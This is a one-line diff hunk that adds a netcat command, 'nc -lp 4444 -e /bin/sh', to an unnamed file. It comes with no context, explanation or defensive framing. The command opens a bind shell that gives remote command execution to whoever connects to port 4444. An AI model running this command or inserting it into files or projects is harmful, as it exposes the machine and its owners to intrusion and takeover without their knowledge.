@@ -1,0 +1,1 @@
+nc -lp 4444 -e /bin/sh
